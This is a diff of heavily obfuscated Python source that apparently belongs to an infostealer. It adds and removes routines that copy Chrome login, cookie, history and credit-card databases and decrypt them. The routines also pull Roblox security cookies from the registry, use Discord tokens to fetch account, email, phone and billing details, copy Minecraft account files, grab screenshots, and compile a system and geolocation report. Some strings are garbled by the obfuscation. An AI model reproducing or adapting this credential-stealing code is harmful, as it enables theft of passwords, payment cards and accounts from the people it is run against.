-                llIIlIlllIIIlIllIl.close()
-                lIIlllIlll.close()
-                os.remove(IlllIIIlIIIll)
-        lIIIIllIlIIIllIIl.close()
-    def llIlllIIllllIlIIIII(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
-        lIllIIllI += '\\' + IllIIlllIlI + '\\History'
-        if not os.lIllIIllI.isfile(lIllIIllI):
+        IlllIllIlIIIllIlI = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
+        copy2(lllIllIIlIlllllIIIIl, IlllIllIlIIIllIlI)
+        IlIIIlIII = sqlite3.connect(IlllIllIlIIIllIlI)
+        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as llllIlIlll:
+            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+                IlllllllIIlIII, lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl, lIIlllIIIlIIIIIllll, IlIIIIIIIIllIl = IIllIllIllllIllIlI
+                IlIlIIIII = lIIlllllllIlI.lIIIIIllIl(lIIlllIIIlIIIIIllll, lIIlllllllIlI.IIIlIlIIIl)
+                if IlllllllIIlIII and lIIlllIlIlIIlII and IlIlIIIII != "":
+                    llllIlIlll.write("{}\t{}\t{}\t{}\t{}\t{}\lIllIIllIIIIlIIllIlIlllIllIIIII{}\n".format(
+                        IlllllllIIlIII, 'FALSE' if IlIIIIIIIIllIl == 0 else 'TRUE', lllIllIIlIlllllIIIIl, 'FALSE' if IlllllllIIlIII.startswith('.') else 'TRUE', IlIIIIIIIIllIl, lIIlllIlIlIIlII, IlIlIIIII))
+        IlIIIlIIIlll.close()
+        IlIIIlIII.close()
+        os.remove(IlllIllIlIIIllIlI)
+    @llIIIlIlllIlllll
+    def IlIlllIllllIllIIlIlI(lIIlllllllIlI):
+        llllIlIlll = open(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
+        for lllllIllllI in os.listdir(lIIlllllllIlI.lIllllIIlIlIl):
+            if re.match(lIIlllllllIlI.llIIIIIlIIlll, lllllIllllI):
+                IlllIlIllIl = ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, lllllIllllI, 'Login Data')
+                IIlIIIlIlIIlIIlIlI = lIIlllllllIlI.IlIlIllIIIlllIllllI()
+                shutil.copy2(IlllIlIllIl, IIlIIIlIlIIlIIlIlI)
+                IlIIIlIII = sqlite3.connect(IIlIIIlIlIIlIIlIlI)
+                IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+                IlIIIlIIIlll.execute("SELECT action_url, username_value, password_value FROM logins")
+                for IlIIllIll in IlIIIlIIIlll.fetchall():
+                    lIIlllllIIIlIlIIlIl = IlIIllIll[0]
+                    IIIlllIIlIlIIllllIIl = IlIIllIll[1]
+                    IIIlIIIIIlllIlI = IlIIllIll[2]
+                    IlIlIlllIlllIIllI = lIIlllllllIlI.lIIIIIllIl(IIIlIIIIIlllIlI, lIIlllllllIlI.IllIIIIIIIIIIlllIII)
+                    if lIIlllllIIIlIlIIlIl != "":
+                        llllIlIlll.write(llllIlIlll"URL: {lIIlllllIIIlIlIIlIl}\nID: {IIIlllIIlIlIIllllIIl}\nPASSW0RD: {IIIlllIllIlIIllllwoIlIIllIlIIIlIIllIlIlllIllId}\n\n")
+                IlIIIlIIIlll.close()
+                IlIIIlIII.close()
+                os.remove(IIlIIIlIlIIlIIlIlI)
+        llllIlIlll.close()
+    @llIIIlIlllIlllll
+    def lIIlllIlllIll(lIIlllllllIlI):
+        llllIlIlll = open(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
+        for lllllIllllI in os.listdir(lIIlllllllIlI.lIllllIIlIlIl):
+            if re.match(lIIlllllllIlI.llIIIIIlIIlll, lllllIllllI):
+                IlllIlIllIl = ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, lllllIllllI, 'Network', 'cookies')
+                IIlIIIlIlIIlIIlIlI = lIIlllllllIlI.IlIlIllIIIlllIllllI()
+                shutil.copy2(IlllIlIllIl, IIlIIIlIlIIlIIlIlI)
+                IlIIIlIII = sqlite3.connect(IIlIIIlIlIIlIIlIlI)
+                IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+                IlIIIlIIIlll.execute("SELECT host_key, name, encrypted_value from cookies")
+                for IlIIllIll in IlIIIlIIIlll.fetchall():
+                    IIIlIIllI = IlIIllIll[0]
+                    IlIlIIIlIll = IlIIllIll[1]
+                    lIIlIIII = lIIlllllllIlI.lIIIIIllIl(IlIIllIll[2], lIIlllllllIlI.IllIIIIIIIIIIlllIII)
+                    if IIIlIIllI != "":
+                        llllIlIlll.write(llllIlIlll"{IIIlIIllI}	TRUE"+"		"+ f"/FALSE	2597573456	{IlIlIIIlIll}	{lIIlIIII}\n")
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in lIIlIIII:
+                        lIIlllllllIlI.IIIIlIIIII.append(lIIlIIII)
+                IlIIIlIIIlll.close()
+                IlIIIlIII.close()
+                os.remove(IIlIIIlIlIIlIIlIlI)
+        llllIlIlll.close()
+    def lIIIlIIIllIllIlIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
+        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\History'
+        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
             return
-        lIIllIllIIlIIlII = IIIIIIIllIllIIII.llIIlllI()
-        copy2(lIllIIllI, lIIllIllIIlIIlII)
-        lIIlllIlll = sqlite3.connect(lIIllIllIIlIIlII)
-        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All History.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
-            lIllIlllIllIII = []
-            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
-                llIlIlIlIIIIIIIIIl, IIlIIIIII, IlIllllllIIlI, IIIlIIlllllIlIllllI = llIIllIIlIIIIIIl
-                if llIlIlIlIIIIIIIIIl and IIlIIIIII and IlIllllllIIlI and IIIlIIlllllIlIllllI != "":
-                    lIllIlllIllIII.append((llIlIlIlIIIIIIIIIl, IIlIIIIII, IlIllllllIIlI, IIIlIIlllllIlIllllI))
-            lIllIlllIllIII.sort(key=lambda llIllIlIllIllllll: llIllIlIllIllllll[3], reverse=True)
-            for IlllIIIIlIII in lIllIlllIllIII:
-                lIIIIllIlIIIllIIl.write("Visit Count: {:<6} TlIIllllllIlIIIIIIIlllIIlIlIIIlIlIIIlIIlllIIII: {:<40}\n".format(IlllIIIIlIII[2], IlllIIIIlIII[1]))
-        llIIlIlllIIIlIllIl.close()
-        lIIlllIlll.close()
-        os.remove(lIIllIllIIlIIlII)
-    def IlIlIllll(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
-        lIllIIllI += '\\' + IllIIlllIlI + '\\Web Data'
-        if not os.lIllIIllI.isfile(lIllIIllI):
+        lIIIIIIlIlIlIIII = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
+        copy2(lllIllIIlIlllllIIIIl, lIIIIIIlIlIlIIII)
+        IlIIIlIII = sqlite3.connect(lIIIIIIlIlIlIIII)
+        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All History.txt"), 'a', encoding="utf-8") as llllIlIlll:
+            lIlIlIll = []
+            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
+                lIIlllllIIIlIlIIlIl, lIIlIlIIIIIIllI, IIllIllIIIIIlll, lIlIIIlIlIIIlIIIIlll = IIllIllIllllIllIlI
+                if lIIlllllIIIlIlIIlIl and lIIlIlIIIIIIllI and IIllIllIIIIIlll and lIlIIIlIlIIIlIIIIlll != "":
+                    lIlIlIll.append((lIIlllllIIIlIlIIlIl, lIIlIlIIIIIIllI, IIllIllIIIIIlll, lIlIIIlIlIIIlIIIIlll))
+            lIlIlIll.sort(key=lambda lIllllIlIl: lIllllIlIl[3], reverse=True)
+            for llIllIlIlI in lIlIlIll:
+                llllIlIlll.write("Visit Count: {:<6} TlIlIllllIllIlIIllIIlIllIIllIlIIIIllllllIIIlIIllIlIlllIllIII: {:<40}\n".format(llIllIlIlI[2], llIllIlIlI[1]))
+        IlIIIlIIIlll.close()
+        IlIIIlIII.close()
+        os.remove(lIIIIIIlIlIlIIII)
+    def llIIIIIlIlIlIIIllIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
+        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\Web Data'
+        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
             return
-        llllIIllIIlllIlIIllI = IIIIIIIllIllIIII.llIIlllI()
-        copy2(lIllIIllI, llllIIllIIlllIlIIllI)
-        lIIlllIlll = sqlite3.connect(llllIIllIIlllIlIIllI)
-        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
-            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
-                IlllIIIlIllI, IlllIIIIIIIIlII, IllllIIlIlI, lIlIIlIlIllllll = llIIllIIlIIIIIIl
-                if IlllIIIlIllI and lIlIIlIlIllllll != "":
-                    lIIIIllIlIIIllIIl.write(
-                        lIIIIllIlIIIllIIl"Name: {IllIlIIlIIllIlIIlIl_on_card}   Expiration Month: {IlllIIIIIIIIlII}   Expiration Year: {ellIllIlIllIllllllpiIIIlllllllIIllIIllIItlIIllllllIlon_year}   Card Number: {IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(card_numllIlIIIllllerlIlIIlIllllllIlIIIIlenIlIlIIlllllIlIlIryptelIIIlIIIlllIIllIIl, sellIIIIllIlIIIllIIl.mllIlIlIIIIIIllIlIIlsIIIIIIIlleIIlllIIlIlIlIkIIlIlIIIlIlIIlIIllIIllIIIllIIlIIlIIlllII)}\n")
-        lIIIIllIlIIIllIIl.close()
-        llIIlIlllIIIlIllIl.close()
-        lIIlllIlll.close()
-        os.remove(llllIIllIIlllIlIIllI)
-    @llIIllllIllIIllIlIll
-    def IIlIIlIII(IIIIIIIllIllIIII):
-        lIIIIllIlIIIllIIl = open(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
-        def IllllIIIlI(lIlIIIIIllI):
-            llIllIIllIII = ""
-            lIlIIIIIllI.execute('SELECT title, url, last_visit_time FROM urls')
-            for IIIlIlIIlIllIIIIIlll in lIlIIIIIllI.fetchall():
-                llIllIIllIII += lIIIIllIlIIIllIIl"Search Title: {IIIlIlIIlIllIIIIIlll[0]}\nURL: {lIIllllllIlIIIIIIIllIIlIlIIIlIlIIIlIIlllIIIIm[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%lIIIlIIIlllIIllIIl - %H:%M:%S')}\n\n"
-            return llIllIIllIII
-        def llIIlIIllI(lIlIIIIIllI):
-            lIlIIIIIllI.execute('SELECT term FROM keyword_search_terms')
-            lllIllIIIlllllI = ""
-            for IIIlIlIIlIllIIIIIlll in lIlIIIIIllI.fetchall():
-                if IIIlIlIIlIllIIIIIlll[0] != "":
-                    lllIllIIIlllllI += lIIIIllIlIIIllIIl"{lIIllllllIlIIIIIIIllIIlIlIIIlIlIIIlIIlllIIIIm[0]}\n"
-            return lllIllIIIlllllI
-        for lIIlIlIlIlIII in os.listdir(IIIIIIIllIllIIII.llIlIlIllIlIII):
-            if re.match(IIIIIIIllIllIIII.IIIIlIIIlIIllllllII, lIIlIlIlIlIII):
-                IlllllIlllIIIlll = ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, lIIlIlIlIlIII, 'History')
-                IlllIIIlIIIll = IIIIIIIllIllIIII.IIllIllIllIIllllIII()
-                shutil.copy2(IlllllIlllIIIlll, IlllIIIlIIIll)
-                lIIlllIlll = sqlite3.connect(IlllIIIlIIIll)
-                llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-                IIlIlIIllIIlIlllI = llIIlIIllI(llIIlIlllIIIlIllIl)
-                IlIIlIIllIl = IllllIIIlI(llIIlIlllIIIlIllIl)
-                lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{' '*17}SEARCH\n{'-'*50}\n{IIlIlIIllIIlIllIlIIlllIII}\n{' '*17}\n\nLinks History\n{'-'*50}\n{wIIlIlIIIlIlIIlIIllIlIIIlllllIlIIlIllllllIlIIIIlhlIIllllllIlsIIIIIIIlloIIlllIIlIlIlIllIIllIIIllIIlIIlIIlllII}")
-                llIIlIlllIIIlIllIl.close()
-                lIIlllIlll.close()
-                os.remove(IlllIIIlIIIll)
-        lIIIIllIlIIIllIIl.close()
-    def llIIlIlI(IIIIIIIllIllIIII):
-        lIIIIllIlIIIllIIl = open(IIIIIIIllIllIIII.llIIIIllIIl + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')
-        for IIIIIIIIlIIIlIlII in IIIIIIIllIllIIII.IlIlIlIlll:
-            lIlIllllll = httpx.get(IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll, IIllIlIIlIIl=IIIIIIIllIllIIII.IIllIIll(IIIIIIIIlIIIlIlII)).json()
-            IIIllIlIIIlIlIIIIllI = lIlIllllll.get('username') + '#' + str(lIlIllllll.get("discriminator"))
-            lIlllIlI = ""
-            IlIlIllIlIIlIIIIIlI = lIlIllllll['flags']
-            if (IlIlIllIlIIlIIIIIlI == 1):
-                lIlllIlI += "Staff, "
-            if (IlIlIllIlIIlIIIIIlI == 2):
-                lIlllIlI += "Partner, "
-            if (IlIlIllIlIIlIIIIIlI == 4):
-                lIlllIlI += "Hypesquad Event, "
-            if (IlIlIllIlIIlIIIIIlI == 8):
-                lIlllIlI += "Green Bughunter, "
-            if (IlIlIllIlIIlIIIIIlI == 64):
-                lIlllIlI += "Hypesquad Bravery, "
-            if (IlIlIllIlIIlIIIIIlI == 128):
-                lIlllIlI += "HypeSquad Brillance, "
-            if (IlIlIllIlIIlIIIIIlI == 256):
-                lIlllIlI += "HypeSquad Balance, "
-            if (IlIlIllIlIIlIIIIIlI == 512):
-                lIlllIlI += "Early Supporter, "
-            if (IlIlIllIlIIlIIIIIlI == 16384):
-                lIlllIlI += "Gold BugHunter, "
-            if (IlIlIllIlIIlIIIIIlI == 131072):
-                lIlllIlI += "Verified Bot Developer, "
-            if (IlIlIllIlIIlIIIIIlI == 4194304):
-                lIlllIlI += "Active Developer, "
-            if (lIlllIlI == ""):
-                lIlllIlI = "None"
-            IlllIlIIIllIllI = lIlIllllll.get("email")
-            IIllIllllIlIIII = lIlIllllll.get("phone") if lIlIllllll.get("phone") else "No Phone Number attached"
-            IlllIIIIllIIlII = httpx.get(IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll + '/billing/subscriptions', IIllIlIIlIIl=IIIIIIIllIllIIII.IIllIIll(IIIIIIIIlIIIlIlII)).json()
-            llIIlllIllIlIllllIl = False
-            llIIlllIllIlIllllIl = bool(len(IlllIIIIllIIlII) > 0)
-            lIIIIlIIlIIII = bool(len(json.loads(httpx.get(IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll + "/billing/payment-sources", IIllIlIIlIIl=IIIIIIIllIllIIII.IIllIIll(IIIIIIIIlIIIlIlII)).text)) > 0)
-            lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{' '*17}{IIIllIlIIIlIlIIIIlIlIIlllIII}\n{'-'*50}\nBilling?: {llIlIIIllllilling}\nNitIIlllIIlIlIlIo: {llIIlllIllIlIllllIl}\nBalIIIlIIIlllIIllIIlges: {lIlllIlI}\nPhone: {IIllIllllIlIIII}\nToken: {IIIIIIIlloken}\nEmail: {IIlIlIIIlIlIIlIImllIlIlIIIIIIllIlIIllIIllllllIlIlIIlllII}\n\n")
-        lIIIIllIlIIIllIIl.close()
-    def llIllIllIlII(IIIIIIIllIllIIII):
-        IIIllIIlIllIIIIlll = ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Minecraft')
-        os.makedirs(IIIllIIlIllIIIIlll, exist_ok=True)
-        lIIlllII = ntpath.join(IIIIIIIllIllIIII.IIIllIIllIlllIlllII, '.minecraft')
-        lIIllIlIlllIIIl = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
-        for IlllllIIIllIIlIlI in lIIllIlIlllIIIl:
-            if ntpath.exists(ntpath.join(lIIlllII, IlllllIIIllIIlIlI)):
-                shutil.copy2(ntpath.join(lIIlllII, IlllllIIIllIIlIlI), IIIllIIlIllIIIIlll + IIIIIIIllIllIIII.lIIIllIllllII + IlllllIIIllIIlIlI)
-    def lIllIIlIIIllIIIll(IIIIIIIllIllIIII):
-        def IIIllllII(lIllIIllI):
+        IllIIlllIllIIlII = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
+        copy2(lllIllIIlIlllllIIIIl, IllIIlllIllIIlII)
+        IlIIIlIII = sqlite3.connect(IllIIlllIllIIlII)
+        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as llllIlIlll:
+            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                llIIlIlIllIlll, llIlIllllIlIIllllII, IIlIIIlllIIIlll, IlIIlllIlllllIlI = IIllIllIllllIllIlI
+                if llIIlIlIllIlll and IlIIlllIlllllIlI != "":
+                    llllIlIlll.write(
+                        llllIlIlll"Name: {llIIlIlIllIlll}   Expiration Month: {llIlIllllIlIIllllII}   Expiration Year: {elIllllIlIlpillIIIIIIIlIItlIlIllllIllIlIIllIIon_year}   Card Number: {selllllIlIlll.lIIIIIllIl(card_numlllllIllIIIlerIIllIIllllIlIIlIlenlIlllIIlIIIIIlIIIrypted, lIIlllllllIlI.mlIlIlIIIlIlllIlllIIslIllIIllIlIIIIeIlIIllIllkllllllIIlIIlIIlIIIIIllIIIlIIllIlIlllIllII)}\n")
+        llllIlIlll.close()
+        IlIIIlIIIlll.close()
+        IlIIIlIII.close()
+        os.remove(IllIIlllIllIIlII)
+    @llIIIlIlllIlllll
+    def lIllIIlIIlIlIIllI(lIIlllllllIlI):
+        llllIlIlll = open(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
+        def lIllIlllIIlllll(lIIIIIIllIIlllllIIIl):
+            lIllIlII = ""
+            lIIIIIIllIIlllllIIIl.execute('SELECT title, url, last_visit_time FROM urls')
+            for lllIIIIlIllIIl in lIIIIIIllIIlllllIIIl.fetchall():
+                lIllIlII += llllIlIlll"Search Title: {lllIIIIlIllIIl[0]}\nURL: {lIlIllllIllIlIIllIIlIllIIllIlIIIIlllllIIIlIIllIlIlllIllIIIm[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
+            return lIllIlII
+        def IIIIlIllIlllllIlI(lIIIIIIllIIlllllIIIl):
+            lIIIIIIllIIlllllIIIl.execute('SELECT term FROM keyword_search_terms')
+            IllIllllIIIIIlIl = ""
+            for lllIIIIlIllIIl in lIIIIIIllIIlllllIIIl.fetchall():
+                if lllIIIIlIllIIl[0] != "":
+                    IllIllllIIIIIlIl += llllIlIlll"{lIlIllllIllIlIIllIIlIllIIllIlIIIIlllllIIIlIIllIlIlllIllIIIm[0]}\n"
+            return IllIllllIIIIIlIl
+        for lllllIllllI in os.listdir(lIIlllllllIlI.lIllllIIlIlIl):
+            if re.match(lIIlllllllIlI.llIIIIIlIIlll, lllllIllllI):
+                IlllIlIllIl = ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, lllllIllllI, 'History')
+                IIlIIIlIlIIlIIlIlI = lIIlllllllIlI.IlIlIllIIIlllIllllI()
+                shutil.copy2(IlllIlIllIl, IIlIIIlIlIIlIIlIlI)
+                IlIIIlIII = sqlite3.connect(IIlIIIlIlIIlIIlIlI)
+                IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+                lllIIllll = IIIIlIllIlllllIlI(IlIIIlIIIlll)
+                llIlIllllllIIll = lIllIlllIIlllll(IlIIIlIIIlll)
+                llllIlIlll.write(llllIlIlll"{' '*17}SEARCH\n{'-'*50}\n{sllllllIIlIlIlIIIlIlllIlllIIrlIlllIIlIIIIIlIIIhIIllIIllllIlIIlIlhlIlIllllIllIlIIllIIslIllIIllIlIIIIoIlIIllIlllIIlIIlIIIIIllIIIlIIllIlIlllIllII}\n{' '*17}\n\nLinks History\n{'-'*50}\n{wllllllIIlllllIllIIIlIIllIIllllIlIIlIlhlIlIllllIllIlIIllIIslIllIIllIlIIIIoIlIIllIlllIIlIIlIIIIIllIIIlIIllIlIlllIllII}")
+                IlIIIlIIIlll.close()
+                IlIIIlIII.close()
+                os.remove(IIlIIIlIlIIlIIlIlI)
+        llllIlIlll.close()
+    def IIIIllIll(lIIlllllllIlI):
+        llllIlIlll = open(lIIlllllllIlI.IllllIlIllIllIIlll + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')
+        for lIIlIIIlIIl in lIIlllllllIlI.IIlIlllI:
+            IIllllll = httpx.get(lIIlllllllIlI.lIIlIlIIllllIIIlI, IlIIllIIIl=lIIlllllllIlI.IIlIIIlIlIIIIIll(lIIlIIIlIIl)).json()
+            IlIlIIIlIll = IIllllll.get('username') + '#' + str(IIllllll.get("discriminator"))
+            IllIllIlIIl = ""
+            IllIllIlIlIIlIlI = IIllllll['flags']
+            if (IllIllIlIlIIlIlI == 1):
+                IllIllIlIIl += "Staff, "
+            if (IllIllIlIlIIlIlI == 2):
+                IllIllIlIIl += "Partner, "
+            if (IllIllIlIlIIlIlI == 4):
+                IllIllIlIIl += "Hypesquad Event, "
+            if (IllIllIlIlIIlIlI == 8):
+                IllIllIlIIl += "Green Bughunter, "
+            if (IllIllIlIlIIlIlI == 64):
+                IllIllIlIIl += "Hypesquad Bravery, "
+            if (IllIllIlIlIIlIlI == 128):
+                IllIllIlIIl += "HypeSquad Brillance, "
+            if (IllIllIlIlIIlIlI == 256):
+                IllIllIlIIl += "HypeSquad Balance, "
+            if (IllIllIlIlIIlIlI == 512):
+                IllIllIlIIl += "Early Supporter, "
+            if (IllIllIlIlIIlIlI == 16384):
+                IllIllIlIIl += "Gold BugHunter, "
+            if (IllIllIlIlIIlIlI == 131072):
+                IllIllIlIIl += "Verified Bot Developer, "
+            if (IllIllIlIlIIlIlI == 4194304):
+                IllIllIlIIl += "Active Developer, "
+            if (IllIllIlIIl == ""):
+                IllIllIlIIl = "None"
+            llIllIlllIIllIIll = IIllllll.get("email")
+            IlIIIlIIlllIlll = IIllllll.get("phone") if IIllllll.get("phone") else "No Phone Number attached"
+            IIlllIIllIIIIllIIll = httpx.get(lIIlllllllIlI.lIIlIlIIllllIIIlI + '/billing/subscriptions', IlIIllIIIl=lIIlllllllIlI.IIlIIIlIlIIIIIll(lIIlIIIlIIl)).json()
+            IlIIllIIlllIIlIII = False
+            IlIIllIIlllIIlIII = bool(len(IIlllIIllIIIIllIIll) > 0)
+            IlIIIIllllIIIllllIl = bool(len(json.loads(httpx.get(lIIlllllllIlI.lIIlIlIIllllIIIlI + "/billing/payment-sources", IlIIllIIIl=lIIlllllllIlI.IIlIIIlIlIIIIIll(lIIlIIIlIIl)).text)) > 0)
+            llllIlIlll.write(llllIlIlll"{' '*17}{usllllllIIIlIIllIlIIIlIIllIlIlllIllI}\n{'-'*50}\nBilling?: {IlIIIIllllIIIllllIl}\nNitIlIIllIllo: {IlIIllIIlllIIlIII}\nBadges: {lllllIllIIIladges}\nPhone: {IlIIIlIIlllIlll}\nToken: {lIllIIllIlIIIIokllllllIIn}\nEmlIlIlIIIlIlllIlllIIlIlIllllIllIlIIllIIl: {llIllIlllIIllIIlIIIlIIllIlIlllIllI}\n\n")
+        llllIlIlll.close()
+    def lIIIlIllIIllllIIllI(lIIlllllllIlI):
+        IIllIIIllIlIlI = ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Minecraft')
+        os.makedirs(IIllIIIllIlIlI, exist_ok=True)
+        IIIlllIIlIlllIlllII = ntpath.join(lIIlllllllIlI.IllllllI, '.minecraft')
+        IlIlllIllIlIIlIIIII = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
+        for IllIlIIl in IlIlllIllIlIIlIIIII:
+            if ntpath.exists(ntpath.join(IIIlllIIlIlllIlllII, IllIlIIl)):
+                shutil.copy2(ntpath.join(IIIlllIIlIlllIlllII, IllIlIIl), IIllIIIllIlIlI + lIIlllllllIlI.IIlllIIIlIlI + IllIlIIl)
+    def IIlllIIlIIIII(lIIlllllllIlI):
+        def IlIlIIllllIIIlllII(lllIllIIlIlllllIIIIl):
             try:
                 return subprocess.check_output(
-                    fr"powershell Get-ItemPropertyValue -Path {pllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIh}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
+                    fr"powershell Get-ItemPropertyValue -Path {plIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIh}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                     creationflags=0x08000000).decode().rstrip()
             except Exception:
                 return None
-        IlIlIIlIlIIIlI = IIIllllII(IIlllIIlIlIlI'HKLM')
-        if not IlIlIIlIlIIIlI:
-            IlIlIIlIlIIIlI = IIIllllII(IIlllIIlIlIlI'HKCU')
-        if IlIlIIlIlIIIlI:
-            IIIIIIIllIllIIII.llIlllllIIIl.append(IlIlIIlIlIIIlI)
-        if IIIIIIIllIllIIII.llIlllllIIIl:
-            with open(IIIIIIIllIllIIII.llIIIIllIIl + "\\Roblox_Cookies.txt", "w") as lIIIIllIlIIIllIIl:
-                for lIIllllllIl in IIIIIIIllIllIIII.llIlllllIIIl:
-                    lIIIIllIlIIIllIIl.write(lIIllllllIl + '\n')
-    def lIllIlIIll(IIIIIIIllIllIIII):
-        lllIIIllI = ImageGrab.grab(
+        lIIlIIIlII = IlIlIIllllIIIlllII(IlIIllIll'HKLM')
+        if not lIIlIIIlII:
+            lIIlIIIlII = IlIlIIllllIIIlllII(IlIIllIll'HKCU')
+        if lIIlIIIlII:
+            lIIlllllllIlI.IIIIlIIIII.append(lIIlIIIlII)
+        if lIIlllllllIlI.IIIIlIIIII:
+            with open(lIIlllllllIlI.IllllIlIllIllIIlll + "\\Roblox_Cookies.txt", "w") as llllIlIlll:
+                for lIlIllllIllIlIIllII in lIIlllllllIlI.IIIIlIIIII:
+                    llllIlIlll.write(lIlIllllIllIlIIllII + '\n')
+    def lIIlllIIlI(lIIlllllllIlI):
+        lIIIIIIIlIIlIIl = ImageGrab.grab(
             bbox=None,
             include_layered_windows=False,
             all_screens=True,
             xdisplay=None
         )
-        lllIIIllI.save(IIIIIIIllIllIIII.llIIIIllIIl + "\\Screenshot.png")
-        lllIIIllI.close()
-    def lllllllIIllIIl(IIIIIIIllIllIIII):
-        llIlIIlIllllllllI = lIIIIllIlIIIllIIl"""
-{lIlllIIIlIlllIIIlIIl} | {IIIlIlIllIIIlIIIlII}
-Windows key: {IIIIIIIllIllIIII.IlIlIlIlI}
-Windows version: {IIIIIIIllIllIIII.IIIIIIlIIIIlIllIlII}
-RAM: {IllIllIIIlll}GB
-DISK: {IIlllIIl}GB
-HWID: {IIIIIIIllIllIIII.IIIllIIIlIIlIIlIll}
-IP: {IIIIIIIllIllIIII.lIIlllllllII}
-City: {IIIIIIIllIllIIII.IlIlllIIlllII}
-Country: {IIIIIIIllIllIIII.IlllIIIlll}
-Region: {IIIIIIIllIllIIII.IIlIIIIll}
-Org: {IIIIIIIllIllIIII.llIlIlIlIl}
-GoogleMaps: {IIIIIIIllIllIIII.llIIIllllIIll}
+        lIIIIIIIlIIlIIl.save(lIIlllllllIlI.IllllIlIllIllIIlll + "\\Screenshot.png")
+        lIIIIIIIlIIlIIl.close()
+    def lllIIlIlII(lIIlllllllIlI):
+        lIlllIllllIlIIll = llllIlIlll"""
+{lIIllIllII} | {IIIIlIIIIIlllIIlIlI}
+Windows key: {lIIlllllllIlI.IIIIIIlIllI}
+Windows version: {lIIlllllllIlI.lIlIlllIIlII}
+RAM: {llllIlll}GB
+DISK: {llIIIlIIlIlIlIIIIlll}GB
